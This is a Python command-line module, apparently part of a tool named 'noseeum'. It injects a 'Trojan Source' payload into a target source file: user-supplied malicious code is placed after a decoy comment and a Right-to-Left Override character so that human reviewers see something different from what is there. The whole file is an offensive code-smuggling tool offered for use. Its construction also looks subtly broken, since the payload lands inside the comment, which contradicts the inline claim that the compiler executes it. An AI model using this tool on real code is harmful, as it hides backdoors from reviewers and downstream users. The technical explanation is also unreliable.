import click
import os
from typing import Optional

# Import error handling utilities
from noseeum.utils.error_handlers import validate_line_number, handle_file_error, read_file_with_encoding

def sanitize_payload(payload: str) -> str:
    """
    Sanitize the payload to remove potentially problematic characters
    that could break the injection or cause parsing errors.
    """
    # Remove characters that could break the string literal
    # In most languages, newlines and certain control characters are problematic
    sanitized = payload.replace('\n', ' ').replace('\r', ' ').replace('\t', ' ')

    # Escape quotes to prevent breaking the code structure
    sanitized = sanitized.replace('"', '\\"').replace("'", "\\'")

    # Additional sanitization could be based on the target programming language
    return sanitized


@click.command()
@click.option('--payload-code', required=True, help='The malicious code to hide.')
@click.option('--target-file', required=True, type=click.Path(exists=True, dir_okay=False, writable=True), help='The file to inject the Trojan Source into.')
@click.option('--line-number', type=int, required=False, help='The line number to inject at. Appends to the end if not specified.')
@click.option('--comment-start', default='/*', help='The character sequence to start a block comment.')
@click.option('--comment-end', default='*/', help='The character sequence to end a block comment.')
def bidi(payload_code: str, target_file: str, line_number: Optional[int], comment_start: str, comment_end: str) -> None:
    """
    Executes a Trojan Source (Bidirectional) attack.
    Hides malicious code within an innocent-looking block comment.
    """
    click.echo(f"Executing Bidi attack on {target_file}...")

    # Bidi override characters
    RLO = '\u202e' # Right-to-Left Override

    # This is the visually deceptive part. It looks like a normal comment.
    decoy_text = " begin harmless comment "

    # Sanitize the payload to ensure it's valid for the target language
    # Remove problematic characters that could break the injection
    sanitized_payload = sanitize_payload(payload_code)

    # The payload is constructed to trick the compiler.
    # The RLO character makes a text editor display the subsequent characters in reverse order.
    # A human sees: {comment_start} decoy_text ; {payload_code} {comment_end}
    # But the RLO reverses the display of the second half, making it look like:
    # {comment_start} decoy_text {reversed_end}
    # while the compiler correctly sees the semicolon and executes the payload.
    smuggled_line = f"{comment_start}{decoy_text}{RLO};{sanitized_payload}{comment_end}"

    try:
        # Try to read the file, with fallback encoding detection
        content = read_file_with_encoding(target_file)
        lines = content.splitlines(keepends=True)

        # Check the line number validation
        if line_number is not None and validate_line_number(line_number, len(lines)):
            # Insert at the specified line number (1-indexed)
            lines.insert(line_number - 1, smuggled_line + '\n')
            click.echo(f"Injecting payload at line {line_number}.")
        elif line_number is not None:
            # Invalid line number, append to the end of the file
            lines.append('\n' + smuggled_line + '\n')
            click.echo(f"Invalid line number {line_number}, appending payload to end of file.")
        else:
            # Append to the end of the file
            lines.append('\n' + smuggled_line + '\n')
            click.echo("Appending payload to end of file.")

        # Write file back with UTF-8 encoding
        with open(target_file, 'w', encoding='utf-8') as f:
            f.writelines(lines)

        click.echo("Bidi attack payload successfully injected.")

    except UnicodeDecodeError as e:
        handle_file_error(target_file, e, "reading with UTF-8 encoding")
        click.echo(f"Try checking file encoding or convert to UTF-8 first.", err=True)
    except IOError as e:
        handle_file_error(target_file, e, "processing")
    except Exception as e:
        handle_file_error(target_file, e, "processing")